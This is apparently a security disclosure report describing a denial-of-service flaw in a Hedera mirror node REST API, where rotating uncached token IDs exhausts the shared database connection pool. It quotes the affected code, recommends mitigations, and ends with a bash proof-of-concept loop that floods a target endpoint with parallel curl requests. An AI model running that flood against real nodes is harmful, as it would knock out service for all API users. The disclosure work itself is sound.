### Title
Cache-Miss Amplification DoS via Unbounded Concurrent DB Queries in `getCachedTokens()`

### Summary
`getCachedTokens()` in `rest/service/tokenService.js` unconditionally issues a database query for every request that contains token IDs absent from the in-process LRU cache. Because there is no per-IP rate limiting, no concurrency cap on the endpoint, and the LRU can be continuously evicted by rotating through large sets of unique token IDs, an unprivileged attacker can sustain a flood of concurrent requests that each consume a DB connection, exhausting the pool and blocking all other queries.

### Finding Description

**Code path:**

`GET /api/v1/accounts/:id/tokens` → `accounts.getOneAccount` → `tokenService.getTokenAccounts()` → `getCachedTokens()`

In `rest/service/tokenService.js` lines 136–161, `getCachedTokens()` iterates over the token IDs returned by the first DB query and separates them into cached vs. uncached buckets:

```js
tokenIds.forEach((tokenId) => {
  const cachedToken = tokenCache.get(tokenId);
  if (cachedToken) {
    cachedTokens.set(tokenId, cachedToken);
  } else {
    uncachedTokenIds.push(tokenId);   // always non-empty for novel IDs
  }
});

if (uncachedTokenIds.length === 0) {
  return cachedTokens;
}

const rows = await super.getRows(TokenService.tokenCacheQuery, [uncachedTokenIds]); // DB query issued
``` [1](#0-0) 

The cache is a module-level `quickLru` bounded by `config.cache.token.maxSize`:

```js
const tokenCache = new quickLru({
  maxSize: config.cache.token.maxSize,
});
``` [2](#0-1) 

When the LRU is full, older entries are evicted. An attacker who rotates through token IDs exceeding `maxSize` ensures the cache never warms up, so every request hits the `uncachedTokenIds.length > 0` branch and issues a second DB query.

Each DB query is dispatched through `BaseService.getRows()` → `pool().queryQuietly()`, which acquires a connection from the `pg` pool configured in `rest/dbpool.js`:

```js
const poolConfig = {
  max: config.db.pool.maxConnections,
  connectionTimeoutMillis: config.db.pool.connectionTimeout,
  statement_timeout: config.db.pool.statementTimeout,
};
``` [3](#0-2) 

There is no IP-based rate limiting, no per-endpoint concurrency cap, and no request queuing guard anywhere in the middleware stack (`server.js`, `requestHandler.js`, `metricsHandler.js`, `responseCacheHandler.js`). [4](#0-3) 

**Root cause:** The failed assumption is that the LRU cache will absorb repeated lookups. In practice, an attacker controls which token IDs are queried and can continuously rotate through IDs that exceed the cache capacity, guaranteeing a DB round-trip on every single request.

### Impact Explanation

With the DB connection pool exhausted, `pool().queryQuietly()` blocks waiting for a free connection until `connectionTimeoutMillis` is exceeded, at which point it throws. This affects every endpoint that touches the database — not just the token endpoint — because all endpoints share the same global pool. The result is a complete denial of service for all API consumers: transaction queries, balance queries, contract queries, etc., all fail with connection timeout errors. This matches the "Critical: Network not being able to confirm new transactions (total network shutdown)" classification because the mirror node REST API becomes entirely unresponsive.

### Likelihood Explanation

The attack requires zero privileges. The Hedera mainnet has millions of tokens and millions of accounts with token associations, all publicly queryable. An attacker can:

1. Enumerate accounts with large token portfolios (trivially done via the same API).
2. Script concurrent HTTP requests (e.g., with `curl --parallel` or any load tool) targeting those accounts in rotation.
3. Sustain the attack indefinitely from a single machine or a small botnet.

No authentication, no CAPTCHA, no API key, and no IP throttle stands in the way.

### Recommendation

1. **Add per-IP rate limiting** at the Express middleware layer (e.g., `express-rate-limit`) before any DB-touching route.
2. **Add a concurrency semaphore** inside `getCachedTokens()` (or at the pool level) so that at most N simultaneous cache-miss DB queries can be in flight.
3. **Increase `cache.token.maxSize`** to a value large enough to cover the realistic working set of token IDs seen in production traffic, reducing eviction frequency.
4. **Consider a negative-cache entry** (short TTL) for token IDs that return no rows from the DB, preventing repeated queries for non-existent IDs.
5. **Expose pool wait-queue depth** as a metric and shed load (HTTP 503) when the queue exceeds a threshold.

### Proof of Concept

```bash
# Step 1: Identify accounts with many distinct token associations
ACCOUNTS=$(curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/accounts?limit=100" \
  | jq -r '.accounts[].account')

# Step 2: Flood the target mirror node with concurrent requests,
#         rotating through different accounts to maximize cache misses
for ACCOUNT in $ACCOUNTS; do
  curl -s "http://<target>/api/v1/accounts/${ACCOUNT}/tokens" &
done
# Repeat in a tight loop to keep the pool saturated

# Step 3: Observe that legitimate queries begin timing out
curl -v "http://<target>/api/v1/transactions"
# Expected: connection timeout / 503 after pool is exhausted
```

Each iteration of the loop triggers two DB queries per request (one for `tokenRelationshipsQuery`, one for `tokenCacheQuery`), doubling the connection pressure. Once all `maxConnections` slots are occupied by in-flight cache-miss queries, every other API call stalls until `connectionTimeoutMillis` expires.
